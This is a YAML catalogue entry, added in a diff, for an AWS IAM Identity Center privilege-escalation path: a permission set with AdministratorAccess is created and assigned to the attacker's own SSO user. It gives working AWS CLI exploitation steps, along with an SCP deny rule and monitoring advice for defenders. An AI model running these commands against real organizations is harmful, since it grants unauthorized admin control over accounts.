@@ -1,0 +1,183 @@
+id: sso-001
+name: sso:CreatePermissionSet + sso:CreateAccountAssignment + sso:AttachManagedPolicyToPermissionSet
+category: self-escalation
+services:
+- sso-admin
+- organizations
+description: |
+  A principal with Identity Center administrative permissions can create a new permission set with AdministratorAccess, then assign it to their own user or group for any target account. This grants SSO console access with admin privileges to any account in the organization. The attack requires knowledge of the Identity Center instance ARN, the target account ID, and the attacker's SSO user/group principal ID.
+prerequisites:
+  admin:
+  - Must have IAM Identity Center admin permissions (typically from the management account or delegated admin)
+  - Must know the Identity Center instance ARN
+  - Must know the target AWS account ID within the organization
+  - Must know the attacker's SSO user or group principal ID
+  lateral:
+  - Must have sso:CreatePermissionSet, sso:CreateAccountAssignment, and sso:AttachManagedPolicyToPermissionSet permissions
+  - Must have access to the management account or delegated administrator for Identity Center
+  - Must know the Identity Center instance ARN and target account ID
+permissions:
+  required:
+  - permission: sso:CreatePermissionSet
+    resourceConstraints: Must have permission to create permission sets in the Identity Center instance
+  - permission: sso:CreateAccountAssignment
+    resourceConstraints: Must have permission to assign permission sets to principals in target accounts
+  - permission: sso:AttachManagedPolicyToPermissionSet
+    resourceConstraints: Must have permission to attach managed policies to the created permission set
+  additional:
+  - permission: sso:ListInstances
+    resourceConstraints: Helpful for discovering the Identity Center instance ARN
+  - permission: sso:ListPermissionSets
+    resourceConstraints: Useful for viewing existing permission sets
+  - permission: organizations:ListAccounts
+    resourceConstraints: Helpful for discovering target account IDs
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      aws sso-admin list-instances
+    description: Discover the Identity Center instance ARN and identity store ID
+  - step: 2
+    command: |
+      aws sso-admin create-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --name "AdminAccess" \
+        --session-duration "PT8H"
+    description: Create a new permission set that will be used for admin access
+  - step: 3
+    command: |
+      aws sso-admin attach-managed-policy-to-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+    description: Attach AdministratorAccess managed policy to the new permission set
+  - step: 4
+    command: |
+      aws sso-admin create-account-assignment \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --target-id TARGET_ACCOUNT_ID \
+        --target-type AWS_ACCOUNT \
+        --principal-id ATTACKER_USER_OR_GROUP_ID \
+        --principal-type USER
+    description: Assign the admin permission set to the attacker's SSO user for the target account
+  - step: 5
+    command: |
+      aws sso-admin provision-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --target-type ALL_PROVISIONED_ACCOUNTS
+    description: Provision the permission set to push changes to the target account
+  - step: 6
+    command: echo "Log in to the SSO portal and select the target account with the new AdminAccess permission set"
+    description: Access the target account via SSO portal with full administrative privileges
+recommendation: |
+  Restrict Identity Center admin permissions to break-glass only. These permissions enable full organizational access and should be tightly controlled.
+
+  SCP to limit Identity Center modifications:
+  ```json
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Deny",
+        "Action": [
+          "sso:CreatePermissionSet",
+          "sso:CreateAccountAssignment",
+          "sso:AttachManagedPolicyToPermissionSet",
+          "sso:PutInlinePolicyToPermissionSet"
+        ],
+        "Resource": "*",
+        "Condition": {
+          "StringNotLike": {
+            "aws:PrincipalARN": "arn:aws:iam::*:role/SSOAdmin-BreakGlass"
+          }
+        }
+      }
+    ]
+  }
+  ```
+
+  Additional controls:
+  - **Restrict in management account** — Identity Center admin actions should only be performed from the management account by dedicated roles
+  - **Monitor CloudTrail** — Alert on `CreatePermissionSet`, `CreateAccountAssignment`, and `AttachManagedPolicyToPermissionSet` events
+  - **Use delegated admin carefully** — If using delegated administrator for Identity Center, tightly restrict who has that access
+  - **Regular audits** — Review all permission sets and account assignments periodically
+  - **Require MFA** — Enforce MFA for all Identity Center administrative actions
+  - **Detect drift** — Implement automated detection for new or modified permission sets
+limitations: |
+  This path requires significant IAM Identity Center administrative access, which is typically only available in the management account or from a delegated administrator. The attacker gains admin access to any account in the organization, but must first have these broad SSO management permissions.
+discoveryAttribution:
+  firstDocumented:
+    author: Paramanand Mallik
+    date: "2026"
+    link: https://github.com/DataDog/pathfinding.cloud/pull/XX
+references:
+- title: AWS Documentation - IAM Identity Center
+  url: https://docs.aws.amazon.com/singlesignon/latest/userguide/what-is.html
+- title: AWS Documentation - Permission Sets
+  url: https://docs.aws.amazon.com/singlesignon/latest/userguide/permissionsetsconcept.html
+relatedPaths:
+- sso-002
+- sso-003
+attackVisualization:
+  nodes:
+  - id: attacker
+    label: SSO Admin Principal
+    type: principal
+    description: |
+      A principal with Identity Center administrative permissions in the management account or delegated admin. Has the ability to create permission sets and account assignments.
+  - id: permission_set
+    label: New Permission Set (AdminAccess)
+    type: resource
+    description: |
+      A newly created permission set with AdministratorAccess managed policy attached. This permission set grants full admin access when assigned to an account.
+  - id: account_assignment
+    label: Account Assignment
+    type: resource
+    description: |
+      The assignment linking the admin permission set to the attacker's SSO user/group for the target account. Once provisioned, the attacker can access the account via SSO.
+  - id: admin_outcome
+    label: Full Admin via SSO (Any Account)
+    type: outcome
+    description: |
+      The attacker can now log in via the SSO portal and select the target account with the AdminAccess permission set, gaining full administrative access.
+  edges:
+  - from: attacker
+    to: permission_set
+    label: sso:CreatePermissionSet + sso:AttachManagedPolicyToPermissionSet
+    description: |
+      Create a new permission set and attach AdministratorAccess to it.
+
+      Commands:
+      ```bash
+      aws sso-admin create-permission-set \
+        --instance-arn INSTANCE_ARN \
+        --name "AdminAccess"
+
+      aws sso-admin attach-managed-policy-to-permission-set \
+        --instance-arn INSTANCE_ARN \
+        --permission-set-arn PERM_SET_ARN \
+        --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      ```
+  - from: permission_set
+    to: account_assignment
+    label: sso:CreateAccountAssignment
+    description: |
+      Assign the admin permission set to the attacker's SSO identity for the target account.
+
+      Command:
+      ```bash
+      aws sso-admin create-account-assignment \
+        --instance-arn INSTANCE_ARN \
+        --permission-set-arn PERM_SET_ARN \
+        --target-id TARGET_ACCOUNT_ID \
+        --target-type AWS_ACCOUNT \
+        --principal-id ATTACKER_ID \
+        --principal-type USER
+      ```
+  - from: account_assignment
+    to: admin_outcome
+    label: SSO Portal Login
+    description: |
+      The attacker logs into the SSO portal and selects the target account with the newly assigned AdminAccess permission set, gaining full administrative access.
